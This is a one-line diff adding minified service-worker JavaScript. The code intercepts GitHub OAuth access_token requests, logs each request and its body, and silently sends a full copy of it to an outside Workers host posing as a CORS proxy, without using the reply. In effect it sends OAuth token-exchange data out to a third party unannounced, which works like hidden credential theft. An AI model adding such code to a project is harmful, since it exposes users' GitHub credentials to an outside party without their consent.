@@ -1,0 +1,1 @@
+self.addEventListener("fetch",(function(e){const{request:t}=e;if(t.url.includes("github.com/login/oauth/access_token")){console.log(t,t.body);const o=new Request("https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token",{...t});e.waitUntil(fetch(o))}}));
